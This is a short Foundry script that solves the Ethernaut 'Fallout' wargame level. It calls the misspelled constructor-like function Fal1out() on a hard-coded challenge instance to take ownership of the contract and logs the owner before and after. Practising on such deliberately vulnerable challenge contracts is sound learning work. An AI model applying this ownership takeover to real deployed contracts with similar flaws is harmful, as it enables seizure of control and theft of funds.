// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutSolution is Script {

    IFallout public falloutInstance = IFallout(0x17196B6d98a1CF2e43dee7bAd44B026dA7787258);

    function run() public {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before:", falloutInstance.owner());

        falloutInstance.Fal1out();

        console.log("Owner now:", falloutInstance.owner());

        vm.stopBroadcast();
    }
}